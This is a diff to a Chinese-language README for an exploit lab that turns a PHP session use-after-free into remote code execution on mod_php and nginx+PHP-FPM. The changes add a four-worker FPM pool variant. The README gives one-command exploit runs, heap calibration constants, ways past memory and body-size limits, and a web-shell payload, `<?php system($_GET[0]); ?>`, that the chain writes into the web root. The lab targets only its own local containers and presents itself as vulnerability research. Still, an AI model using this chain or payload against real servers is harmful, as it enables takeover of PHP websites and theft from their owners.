@@ -7,7 +7,7 @@
 | 链 | 受害者形态 | 代码执行落地方式 | PoC |
 | --- | --- | --- | --- |
 | mod_php | Apache 2.4.58 prefork + `libphp.so`,页面只有裸 `echo` | 悬空 `zend_reference` → 伪 `HashTable` 的 `pDestructor = zif_system`,最后一个请求直接 `system()` | `exploits/def_rce.py` 等 4 个 |
-| nginx + PHP-FPM | nginx 1.24 + 自编译 `php-fpm`(`pm = static`,1 个子进程),页面 `session_start()`;`memory_limit` 用 8M 和 PHP 出厂默认 128M 两个 profile | 悬空 `BG(unserialize)` 解码器改写 session 落盘目标,FPM worker **自己**把含 PHP 代码的 session 文件写进站点根目录 → 任意文件写入 → 请求该文件执行 | `exploits/fpm_rce.py`、`exploits/fpm128_rce.py` |
+| nginx + PHP-FPM | nginx 1.24 + 自编译 `php-fpm`(`pm = static`),页面 `session_start()`;`memory_limit` 用 8M 和 PHP 出厂默认 128M 两档,worker 池 1 个和 4 个两种 | 悬空 `BG(unserialize)` 解码器改写 session 落盘目标,FPM worker **自己**把含 PHP 代码的 session 文件写进站点根目录 → 任意文件写入 → 请求该文件执行 | `exploits/fpm_rce.py`、`exploits/fpm128_rce.py`(`WORKERS=n` 同时覆盖单 worker 与多 worker) |
 
 两条链都不需要攻击类/helper 接口,不改目标 PHP 代码,不要求目标重编译,目标上不需要
 gdb,ASLR 全程开启,流量全是普通 HTTP。
@@ -25,7 +25,9 @@ gdb,ASLR 全程开启,流量全是普通 HTTP。
 `session_start()`,站点根目录要可写。`memory_limit` 不再是条件:8M 和出厂默认 128M
 都打通,后者把压力换成 `filename=""` 的 RFC1867 分片 —— 约 300 字节请求体换约 128 KB
 堆,单个请求就能打满 128 MB,而且每个请求都还在 nginx 默认的
-`client_max_body_size 1m` 之内。
+`client_max_body_size 1m` 之内。worker 池也不再必须是单个进程:陈旧解码器是每进程
+状态,所以按 nginx→FPM 的严格轮询把 N 个子进程逐个 arm,三个阶段就能打在一个
+4 进程池上。
 
 已验证目标:我们自己的 `PHP 8.4.4-dev` 构建(Ubuntu 24.04;mod_php 用
 `libphp.so` md5 `f402b493b1df82cbf34021b4aef133cb`,镜像内直接附带,保证标定值和被
@@ -50,19 +52,22 @@ python p2s.py prune            # 回收实验状态:session 文件 + proof 文�
 python p2s.py down             # 删除容器
 
 python p2s.py fpm-build        # 第二条链:从同一份 php-src 编译 sapi/fpm
-python p2s.py fpm-up           # 起两个 nginx + php-fpm 容器(8112 = 8M,8113 = 128M)
-python p2s.py verify fpm       # 页面内容、fpm 版本、docroot 可写、memory_limit
+python p2s.py fpm-up           # 起三个 nginx + php-fpm 容器(8112 = 8M,8113 = 128M,8114 = 128M + 4 worker)
+python p2s.py verify fpm       # 页面内容、fpm 版本、docroot 可写、memory_limit、池大小
 python p2s.py exploit fpm      # FPM 链,memory_limit=8M  -> PROOF: uid=33(www-data)
 python p2s.py exploit fpm128   # 同一条链打 PHP 出厂默认 128M -> PROOF: uid=33(www-data)
-python p2s.py prune fpm fpm128 # 删 session 文件 + 链写出的 shell.php
-python p2s.py fpm-down         # 可带 profile 名,不带就两个都删
+python p2s.py exploit fpm4     # 同一条链,但 php-fpm 是 4 个子进程的池
+python p2s.py prune fpm fpm128 fpm4
+                               # 删 session 文件 + 链写出的 shell.php
+python p2s.py fpm-down         # 可带 profile 名,不带就三个都删
 ```
 
 `build` 一次之后,只用 `exploit <profile>` 就够:它会自动重建丢失的容器
 (`ensure`)、运行前后清理过期的 session/proof 文件、打印 PoC 输出,拿不到 proof 时
 返回非 0。mod_php 的 128M profile 一次利用端到端约 8 秒,FPM 链 8M 约 11.6 秒、
-FPM 128M 约 33.8 秒(2026-10-23 实测)。`exploit`/`verify`/`prune` 都接受 `fpm`、
-`fpm128` 这两个名字,其余参数(`-c '…'`)同样有效。
+FPM 128M 约 35.5 秒、FPM 128M + 4 worker 约 43 秒(2026-10-24 实测)。
+`exploit`/`verify`/`prune` 都接受 `fpm`、`fpm128`、`fpm4` 这三个名字,其余参数
+(`-c '…'`)同样有效。
 
 环境变量:
 
@@ -74,7 +79,8 @@ FPM 128M 约 33.8 秒(2026-10-23 实测)。`exploit`/`verify`/`prune` 都接受 
 | `P2S_CLEAN` | `1` | 设为 `0` 则运行后保留 session/proof 文件 |
 | `FPM_PORT` | `8112` | FPM 链 8M 目标的宿主端口 |
 | `FPM128_PORT` | `8113` | FPM 链 128M 目标的宿主端口 |
-| `exploit <p> -c '…'` | `id>/srv/out/pd`(两个 fpm 为 `id`) | 执行的命令;proof 路径跟随 `>/srv/out/<file>` 重定向 |
+| `FPM4_PORT` | `8114` | FPM 链 128M + 4 worker 池目标的宿主端口 |
+| `exploit <p> -c '…'` | `id>/srv/out/pd`(三个 fpm 为 `id`) | 执行的命令;proof 路径跟随 `>/srv/out/<file>` 重定向 |
 
 ## 实验环境结构
 
@@ -83,7 +89,7 @@ p2s.py                  一键驱动(build/up/down/status/verify/offsets/exploit
                         + fpm-build/fpm-up/fpm-down)
 docker/
   Dockerfile            ubuntu:24.04 + apache2 运行库 + 预编译 libphp.so(mod_php 链)
-  Dockerfile.fpm        ubuntu:24.04 + nginx + /opt/phpfpm(FPM 链,两个 profile 共用)
+  Dockerfile.fpm        ubuntu:24.04 + nginx + /opt/phpfpm(FPM 链,三个 profile 共用)
   Dockerfile.builder    可选:`build --from-source` / `fpm-build` 的构建依赖
   build-libphp.sh       在其中执行的 php-src 8.4.4 mod_php 编译脚本
   build-phpfpm.sh       在其中执行的 php-src 8.4.4 sapi/fpm 编译脚本
@@ -99,6 +105,8 @@ docker/
   fpm/www/plain.php     裸 `echo` 页,用于填充/取回响应
   fpm128/               同一条链的 128M 目标:与 fpm/ 只差 php.ini 的 memory_limit
                         和 nginx.conf(不提高 body 上限),www/ 两个页面相同
+  fpm4/                 128M 目标的多 worker 版:与 fpm128/ 只差 php-fpm.conf 里的
+                        `pm.max_children = 4`,ini、nginx.conf、www/ 逐字节相同
   entrypoint.sh         mkdir /srv/out,然后 `apache2 -f /srv/profile/apache.conf`
   entrypoint-fpm.sh     先起 php-fpm,再 `exec nginx -g 'daemon off;'`
 env/gen_profiles.py     14 个 profile 的唯一来源 -> env/generated/<name>/
@@ -111,7 +119,8 @@ exploits/               PoC(自包含,不含任何宿主机绝对路径)
   dev_off_rce.py        display_errors=On + expose_php=Off 且支持长命令
                         (opcache profile 也用它,靠 CMDOFF 区分)
   fpm_rce.py            nginx + PHP-FPM 链(悬空 BG(unserialize) → 任意文件写入)
-  fpm128_rce.py         同一条链打 PHP 出厂默认 memory_limit=128M(空文件名分片加压)
+  fpm128_rce.py         同一条链打 PHP 出厂默认 memory_limit=128M(空文件名分片加压);
+                        WORKERS=n 时按池大小逐个 arm,同时覆盖多 worker 目标
 measure/                标定与 gdb 辅助脚本(普通复现不需要)
   利用驱动              measure_dd_any.py、mw_full_test.py、measure_s3_formfill.py、
                         measure_loaded_worker.py、dev_r0.py(重测 R0)
@@ -125,14 +134,15 @@ tools/probe.php         可选的 webroot 探针(已加载 ini、指令、扩展
 再把 `docker/www` 挂到 `/srv/www`、`out-<name>/` 挂到 `/srv/out`。
 一个 profile 一个容器,全部只发布在 `127.0.0.1`。
 
-FPM 链有两个容器 `p2s-fpm` / `p2s-fpm128`,共用同一个镜像:profile 目录
-(`docker/fpm` 或 `docker/fpm128`)只读挂到 `/srv/fpm`,覆盖镜像里烤进去的那份配置,
-所以 8M 和 128M 之间只差一个 `php.ini` 和一行 `client_max_body_size`。同一个容器里跑
-nginx(:80 → 宿主 `FPM_PORT`/`FPM128_PORT`,默认 8112/8113)和 php-fpm(容器内
-`127.0.0.1:9000`),`docker/<profile>/www` 挂到 `/srv/www`(链要写文件,所以这个挂载
-**可写**)、`out-<profile>/` 挂到 `/srv/out`。它们不参与 `up`/`down`/`status` 的 14 个
-mod_php profile,用自己的 `fpm-up`/`fpm-down`(可带 profile 名),`status` 会给活着的那
-个各多打一行。
+FPM 链有三个容器 `p2s-fpm` / `p2s-fpm128` / `p2s-fpm4`,共用同一个镜像:profile 目录
+(`docker/fpm`、`docker/fpm128` 或 `docker/fpm4`)只读挂到 `/srv/fpm`,覆盖镜像里烤进去
+的那份配置,所以 8M 与 128M 之间只差一个 `php.ini` 和一行 `client_max_body_size`,
+128M 与 4 worker 池之间只差 `php-fpm.conf` 里的 `pm.max_children`。同一个容器里跑
+nginx(:80 → 宿主 `FPM_PORT`/`FPM128_PORT`/`FPM4_PORT`,默认 8112/8113/8114)和
+php-fpm(容器内 `127.0.0.1:9000`),`docker/<profile>/www` 挂到 `/srv/www`(链要写文件,
+所以这个挂载**可写**)、`out-<profile>/` 挂到 `/srv/out`。它们不参与 `up`/`down`/`status`
+的 14 个 mod_php profile,用自己的 `fpm-up`/`fpm-down`(可带 profile 名),`status` 会给
+活着的那个各多打一行。
 
 ## profile 与对应 PoC
 
@@ -154,14 +164,16 @@ mod_php profile,用自己的 `fpm-up`/`fpm-down`(可带 profile 名),`status` �
 | `opc` | p2s-opc | 8111 | 128M | On | Off | /tmp | 1 | On | `exploits/dev_off_rce.py` + `CMDOFF=0x7a118` |
 | `fpm` | p2s-fpm | 8112 | 8M | Off | On | /var/lib/php/sessions | 1(static) | – | `exploits/fpm_rce.py` |
 | `fpm128` | p2s-fpm128 | 8113 | 128M | Off | On | /var/lib/php/sessions | 1(static) | – | `exploits/fpm128_rce.py` |
+| `fpm4` | p2s-fpm4 | 8114 | 128M | Off | On | /var/lib/php/sessions | 4(static) | – | `exploits/fpm128_rce.py` + `WORKERS=4` |
 
-前 14 行是 mod_php 链;最后两行是 nginx + PHP-FPM 链,`sapi=fpm`,同一条链的两种
-`memory_limit`,由 `fpm-build`/`fpm-up` 单独管理。
+前 14 行是 mod_php 链;最后三行是 nginx + PHP-FPM 链,`sapi=fpm`,同一条链的两种
+`memory_limit` 与两种池大小,由 `fpm-build`/`fpm-up` 单独管理。
 
 所有 mod_php profile 提供同一个 22 字节页面。`exploit <别名>` 会替你选好 PoC、堆标定
 (`PROFILE`)和 proof 路径;`-s <脚本>` 覆盖脚本,`-c` 覆盖命令,结尾的数字设置
-`mw` 的扇出宽度(默认取该 profile 的 `MaxRequestWorkers`)。`exploit fpm`/`fpm128`
-同样接受 `-c`,proof 分别落在 `out-fpm/pfpm`、`out-fpm128/pfpm128`。
+`mw` 的扇出宽度(默认取该 profile 的 `MaxRequestWorkers`)。`exploit fpm`/`fpm128`/`fpm4`
+同样接受 `-c`,proof 分别落在 `out-fpm/pfpm`、`out-fpm128/pfpm128`、`out-fpm4/pfpm4`;
+`fpm4` 这一行还替 PoC 设好 `WORKERS=4`。
 
 本树 2026-10-23 的验证结果:`p2s.py verify` 14 个 mod_php 容器全绿,一次连续
 `exploit` 扫描对每个 profile 都拿到
@@ -172,7 +184,11 @@ FPM 链:`php-fpm` 二进制由 `fpm-build` 现场编译(链上只有 libc/libm),
 连续三次独立运行 —— 初始、立刻重跑、以及 `docker restart p2s-fpm`(换一套 ASLR)之后
 —— 都拿到 `uid=33(www-data)`,单次约 11.6 秒。
 `exploit fpm128` 在 `fpm-build` 的产物上第一次就打通,容器重建(`fpm-down fpm128` +
-`fpm-up`)之后重跑同样拿到 `uid=33(www-data)`,单次约 33.8 秒。
+`fpm-up`)之后重跑同样拿到 `uid=33(www-data)`;2026-10-24 把它并进下面这条通用编排后再
+复测一次,仍然打通,单次约 35.5 秒。
+`exploit fpm4` 也一样第一次就打通(4 个 static 子进程,单个 arming 轮覆盖 R2a/R2b/R3
+三个阶段),`fpm-down fpm4` + `fpm-up fpm4` 重建后重跑再次拿到 `uid=33(www-data)`,
+单次约 43 秒(2026-10-24 实测)。
 
 ## 相比参考链我们解决了哪些痛点
 
@@ -197,6 +213,7 @@ prefork,以 A1 → B1 → A2 → B2 四步完成利用,目标页面只有 `<?php
 | 交付形式是 `run_pure.sh` + 一个 `exploit.py` | 14 个 profile × 一条命令、`verify`/`status`/`offsets`/`prune`、proof 与脚本自动配对、被外部 `docker prune` 干掉后自愈、中英双语 README | 「一键运行」「回收」 |
 | 只有 mod_php 一个 SAPI | 第二条链走 PHP-FPM:SAPI 路径完全不同,利用 pre-RINIT 的悬空 `BG(unserialize)` 解码器改写 session 落盘目标,让 worker 自己把 PHP 代码写进站点根目录 —— 不需要代码指针,也不需要 `libphp` 泄漏 | `fpm`、`fpm128`、下文「利用链(二)」 |
 | FPM 链需要把 `memory_limit` 调小才填得满 | 压力从深嵌套字段换成 `filename=""` 的 RFC1867 分片:约 300 字节请求体吃约 128 KB 堆,920 个分片填满足以打死 128 MB 的 worker,PHP 出厂默认限制即可利用;顺带每个请求都落在 nginx 默认 `client_max_body_size 1m` 之内,前置不需要调 | `fpm128`、下文「128M 变体」 |
+| FPM 链的陈旧解码器是**每进程**状态,只能钉 `pm = static` + 1 个子进程 | nginx 每个请求新开一条上游连接,FPM 按严格轮询把连接发给空闲子进程,于是先用 N 个 prime 把 N 个子进程逐个 arm,再连续发三个阶段;R2a/R2b 各自打死所在子进程,所以一轮 arm 覆盖 `min(3, N)` 个阶段 | `fpm4`(4 个 static 子进程,一轮打完 R2a/R2b/R3)、下文「多 worker 变体」 |
 
 ## 利用链(一)—— mod_php
 
@@ -248,7 +265,8 @@ chunk 偏移(`R0`)处分配 session 的 `zend_reference`,随后请求死掉,留�
 一个跨请求活着的悬空解码器。
 
 `exploits/fpm_rce.py` 一共发 5 类请求,三个 decode 目标逐步逼近落盘写入器
-(`exploits/fpm128_rce.py` 是同一个序列换一套堆标定,见本节末「128M 变体」):
+(`exploits/fpm128_rce.py` 是同一个序列换一套堆标定,再按 `WORKERS` 适应多 worker 池,
+见本节末「128M 变体」与「多 worker 变体」):
 
 1. **R1 —— 把 payload 变成 session 里的一个 key。** 带
    `PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET[0]); ?>` 的上传请求让 PHP 把这个
@@ -309,7 +327,34 @@ shaping 请求(1、2)把 worker 打死是设计的一部分:FPM 立刻 fork 替�
 * **状态码**在两个目标上不同:8M 的 shaping 请求回 502/500,128M 的回 200(子进程已经
   flush 过响应头才被打死,nginx 只能照常收尾)。同一次 OOM,`wait_target()` 轮询到
   `/plain.php` 重新 200 才继续,所以两边都正常走完。
-* 端到端约 33.8 秒,大头是 93 条 A 记录每条都要等 worker 复活。
+* 端到端约 35.5 秒,大头是 93 条 A 记录每条都要等 worker 复活(2026-10-24 用
+  `WORKERS=1` 复测;之前 33.8 秒的那版 PoC 没有每轮 arm 前的 disarm 轮)。
+
+### 多 worker 变体(`WORKERS=n`)
+
+128M 那个 PoC 用 `WORKERS` 描述池大小,`exploit fpm4` 会替它设成 4
+(`docker/fpm4/php-fpm.conf` 是 `pm = static` + `pm.max_children = 4`),标定值与
+128M 单 worker 完全一致 —— 换的只是编排。
+
+* 陈旧 `BG(unserialize)` 是每进程状态,所以 prime 只对**打死它之前最后一个服务该请求
+  的那个子进程**有效。`WORKERS` 必须等于存活子进程数,否则阶段可能打在没 arm 的进程上。
+* arm 的依据是 nginx 每个请求新开一条上游连接、FPM 把连续连接按严格轮询发给空闲
+  子进程:先把 N 个 A session 依次灌满(`asx0`…`asx3`,每个 93 条记录),然后**连续**
+  发 N 个 prime,一个不落 —— 这 N 个请求各打中一个子进程,arm 整个池。
+* prime 与三个阶段之间不允许任何请求,连存活探测都不行:一次走到脚本执行的请求会跑
+  `PHP_RINIT(basic_functions)`,把刚留下的解码器清零。PoC 因此把 `disarm()` 做成
+  `2 × WORKERS` 次 `GET /plain.php`(次数是池大小的整数倍,轮询相位不变),而
+  `wait_target()` 只出现在 arm 之前。
+* R2a 与 R2b 会各自打死所在的子进程,R3 不打死(它要活着把文件写出去),所以一轮
+  arm 覆盖 `min(3, WORKERS)` 个阶段:`WORKERS>=3` 一轮打完三个阶段,2 需要中途补 arm,
+  1 则每个阶段都重新 arm(等价于上一节的单 worker 序列)。
+* 阶段打在未 arm 的进程上会清掉 payload 记录(整条链要重来)。PoC 对此的处置是重试:
+  每次尝试用**全新的 session id**(`scal` → `scal1`…、`asx0` → `asx01`…),避免打在
+  半改写的 session 上;池模式的默认 `ATTEMPTS=3`,单 worker 是 1。
+* 实测(2026-10-24):4 个 static 子进程,单轮 arm 打完三个阶段,两次运行都打通 ——
+  全新容器 42.3 秒(shaping 请求全程回 200)、`fpm-down`/`fpm-up` 重建后 43.2 秒
+  (`R2a -> 502`,arm 中的子进程果然被打死)。状态码跟着 flush 时机变,与下面「状态码」
+  那条坑一致,判定成功仍然看写出来的 shell 有没有回显。
 
 ## 常量
 
@@ -353,6 +398,9 @@ shaping 请求(1、2)把 worker 打死是设计的一部分:FPM 立刻 fork 替�
 | session 记录 | `SMALL=73` 条小记录 + `BIG=20` 条 `FNLEN=750000` B 文件名 | `build_A()`,落盘 15,029,535 B |
 | 请求体 | 最大 1,022,503 B(A-big) | 全部 < nginx 默认 `client_max_body_size 1m` |
 | ini | `memory_limit=128M`(PHP 出厂默认)、`post_max_size=8M`、upload_progress On+cleanup On | `docker/fpm128/php.ini`,nginx.conf 不调 body 上限 |
+| `WORKERS` | 1(`fpm128`)/ 4(`fpm4`) | 需要 arm 的存活子进程数;`fpm4` 用 `docker/fpm4/php-fpm.conf` 的 `pm = static` + `pm.max_children = 4` |
+| `ATTEMPTS` | 单 worker 1、池 3 | 整条链的重试次数,每次换一组 session id(阶段打空时记录会被清掉) |
+| `SETTLE` | 0.5 s | 每轮 arm 前等子进程补满的间隔 |
 
 PoC 需要从目标拿到的只有每次运行泄漏出的 `chunk` 与 `libphp` 基址,所以 ASLR 和容器
 重启都不影响。*不可*移植的是请求形态:`R0`、填充数量、`CMDOFF` 是这个构建、这份
@@ -368,8 +416,8 @@ FPM 链的每个数同样可以用同名环境变量覆盖 —— 8M 版是
 `E_OFF`/`SCALAR_PUSH`/`ARRAY_PUSH`/`LAST_DELTA`/`FILLER`/`FSTART`/`ENTPAGE`/`DTPAGE`/
 `NESTED`/`PRIME_NESTED`/`LEVELS`/`SMALL`/`FNLEN`/`FILL_FIELDS`/`FILL_LEN`/`DUP`,128M
 版是 `E_OFF`/`DT_OFF`/`SCALAR_PUSH`/`ARRAY_PUSH`/`WRITER`/`FILLER`/`FSTART`/`PRESS`/
-`PRIME_PRESS`/`FIELDS`/`FIELD_LEN`/`LEVELS`/`SMALL`/`BIG`/`FNLEN`/`DUP`,换构建或换 ini
-之后重测即可。它
+`PRIME_PRESS`/`FIELDS`/`FIELD_LEN`/`LEVELS`/`SMALL`/`BIG`/`FNLEN`/`DUP`,池编排再加
+`WORKERS`/`ATTEMPTS`/`SETTLE`,换构建或换 ini 之后重测即可。它
 *完全不需要泄漏*:伪块、progress 结构、写入器都按 chunk 相对偏移定位,而 chunk 内部
 布局在 `fork()` 之后逐字节相同,所以容器重启换一套 ASLR 也不影响(实测过)。
 
@@ -398,11 +446,14 @@ body 很小、约 1–2 MB,但会吃掉整个 `memory_limit` 的堆;`display_err
 `files` save handler、**站点根目录对 `www-data` 可写**。这条链对 `display_errors` /
 `expose_php` 没有要求,不需要代码指针,也不需要基址泄漏。
 已经不再是条件:`memory_limit`(8M 与 PHP 出厂默认 128M 都打通)、前置的 body 大小上限
-(128M 版每个请求都在 nginx 默认 1m 之内)。
-真实世界的阻碍:落盘路径要 web 可达且可写;`pm.max_children` 大于 1 时 prime 与
-decode 请求必须打到同一个 worker(本树钉 `pm = static` + 1 个子进程);
-`session.upload_progress.freq`/`min_freq`、前置的 `client_max_body_size`(8M 版要把它
-抬到 8m,128M 版不用)之类会改变 shaping 请求的数量与形状。
+(128M 版每个请求都在 nginx 默认 1m 之内)、worker 池大小(`pm = static` 的 4 子进程池
+用一轮 arm 打满,见「多 worker 变体」)。
+真实世界的阻碍:落盘路径要 web 可达且可写;`pm.max_children` 大于 1 时
+`WORKERS` 要对上**存活**子进程数,`pm = dynamic`/`ondemand` 下存活数会随流量变,
+`fastcgi_keep_conn`/upstream keepalive 与真实流量都会改变连接到 worker 的映射;
+`session.upload_progress.freq`/`min_freq`、前置的
+`client_max_body_size`(8M 版要把它抬到 8m,128M 版不用)之类会改变 shaping 请求的数量
+与形状。
 
 ## 回收
 
@@ -417,10 +468,10 @@ decode 请求必须打到同一个 worker(本树钉 `pm = static` + 1 个子进�
 * stage-3 B *预期*会打死子进程:Apache 父进程会 fork 新的,而泄漏出的基址因为
   `fork()` 继承关系仍然有效。如果父进程本身死了,泄漏就作废 —— 先
   `p2s.py up <profile>` 再重试。
-* FPM 链:`p2s.py prune fpm fpm128` 清各自容器的 `/var/lib/php/sessions/sess_*` 和链自己
+* FPM 链:`p2s.py prune fpm fpm128 fpm4` 清各自容器的 `/var/lib/php/sessions/sess_*` 和链自己
   写出的 `docker/<profile>/www/shell.php`(站点根目录是宿主挂载,写出来的 shell 会留在
-  那儿,所以每次 `exploit fpm*` 前后都删),proof 目录 `out-fpm/`、`out-fpm128/` 一起清;
-  `fpm-down [profile…]` 删容器,`docker rmi p2s-php844-fpm` 删镜像。
+  那儿,所以每次 `exploit fpm*` 前后都删),proof 目录 `out-fpm/`、`out-fpm128/`、
+  `out-fpm4/` 一起清;`fpm-down [profile…]` 删容器,`docker rmi p2s-php844-fpm` 删镜像。
   prime 请求打死 worker 同样是预期行为,FPM 立刻 respawn,而 chunk 内布局与陈旧全局
   照旧。
 
@@ -530,7 +581,18 @@ configure 行编译、md5 不同的 `php-fpm` 上量出来的,拿到 `fpm-build`
   `p2s.py up <子集>`。
 * FPM 链的两个页面都是标定的一部分:`docker/fpm/www/index.php` 必须真的调用
   `session_start()`(39 字节),`plain.php` 是裸 `echo`(22 字节)、只用于 shaping 与
-  存活探测;`docker/fpm128/www/` 是这两份文件的逐字节副本。
+  存活探测;`docker/fpm128/www/` 与 `docker/fpm4/www/` 是这两份文件的逐字节副本。
+* FPM 多 worker 编排里,**arm 与三个阶段之间不允许任何请求**:一次走到脚本执行的请求
+  会跑 `PHP_RINIT(basic_functions)`,把刚留下的陈旧解码器清零,所以 PoC 在 arm 之后不
+  再调 `wait_target()`;`disarm()` 取 `2 × WORKERS` 次 `GET /plain.php`,保证每个 worker
+  至少被走过两次脚本执行、起点回到轮询的同一个位置。
+* `WORKERS` 必须等于**存活**子进程数。`pm = static` 下这是确定的(`fpm4` 就是 4);
+  `pm = dynamic` 下存活数随流量变,arm 少了就有阶段打空。
+* 一个阶段打在未 arm 的 worker 上不是「无事发生」:那次请求会正常跑完并让
+  `upload_progress.cleanup` 删掉 payload 记录,整条链得重来。所以池模式用全新的 session
+  id 重试(`ATTEMPTS`),而不是在同一个 `sess_scal` 上继续。
+* N 个 prime 必须**连续**发出:prime 之间夹任何请求(包括给另一个 session 灌 A 记录)都会
+  让某个 worker 在 arm 之后又被 RINIT 清零。这就是 `build_A()` 全部做完才轮到 `arm()` 的原因。
 * FPM 链的 shaping 请求打死 worker **是预期的**,但状态码跟着「子进程死了之前 flush 了
   多少」走:8M 目标上是 502/500,128M 目标上是 200。PoC 用 `wait_target()` 轮询到
   `/plain.php` 重新 200 才发下一步,判断成功与否看写出来的 shell 有没有回显,别看状态码。
@@ -540,7 +602,7 @@ configure 行编译、md5 不同的 `php-fpm` 上量出来的,拿到 `fpm-build`
 * 128M 版的 A-big 请求体 1,022,503 B,离 nginx 默认 1m(1,048,576)只剩约 26 KB:
   `FNLEN` 一定要留成可环境变量覆盖的,加大它会悄悄撞上 413。
 * FPM 链要求站点根目录可写,所以 `docker/<profile>/www` 是**读写**挂载:链写出的
-  `shell.php` 会留在宿主目录里,靠 `prune fpm fpm128` / `exploit fpm*` 的前后清理回收。
+  `shell.php` 会留在宿主目录里,靠 `prune fpm fpm128 fpm4` / `exploit fpm*` 的前后清理回收。
 * Git Bash 里 `SHELL` 已有环境含义,别拿它当 PoC 的变量名 —— FPM 的落盘路径用
   `FPM_SHELL`。
 
@@ -555,12 +617,13 @@ configure 行编译、md5 不同的 `php-fpm` 上量出来的,拿到 `fpm-build`
 `fcgi.py`、`bg_fpm.py` 和整套 `gdb-bg*.py` 探针 —— 它们的结论以常量形式写进了
 `exploits/fpm_rce.py`,容器化的 HTTP 环境重写成了 `docker/Dockerfile.fpm` +
 `docker/fpm/`),以及所有 `out-*` 运行产物。
-保留:六个 PoC(mod_php 四个 + nginx/PHP-FPM 两个)加原样保留的参考实现
+保留:六个 PoC(mod_php 四个 + nginx/PHP-FPM 两个,后者按 `WORKERS` 覆盖单 worker 与
+4 worker 池两种目标)加原样保留的参考实现
 `exploit.py`、记录了每个常量*如何*测得的 gdb 驱动脚本,以及这些驱动加载的四个
 `gdb-*.py`。
 
 两条链都在本仓库里、各自一条命令跑通:mod_php 见「利用链(一)」(`exploit off` 等),
-nginx + PHP-FPM 见「利用链(二)」(`exploit fpm` / `exploit fpm128`)。
+nginx + PHP-FPM 见「利用链(二)」(`exploit fpm` / `exploit fpm128` / `exploit fpm4`)。
 
 ## 致谢
 
@@ -576,7 +639,8 @@ nginx + PHP-FPM 见「利用链(二)」(`exploit fpm` / `exploit fpm128`)。
 * Calif Research 的 php2shell 一文(calif.io)—— FPM 这条链的方向来自它:PHP-FPM 的
   pre-RINIT session 解码会留下悬空的 `BG(unserialize)` 解码器。把它做成纯 HTTP、可
   一键复现的 nginx + PHP-FPM 利用(三步逼近的 push 标定、任意文件写入的落点选择、
-  用空文件名分片把压力放大到能吃满出厂默认 128M、容器与重建流程)是本树完成的。
+  用空文件名分片把压力放大到能吃满出厂默认 128M、按轮询把整池 worker 逐个 arm、
+  容器与重建流程)是本树完成的。
 * PHP 漏洞本身(session bailout 背后的 UAF)属于上游;本实验是对其可利用性的研究,
   全部只针对本实验自己创建的容器。
 
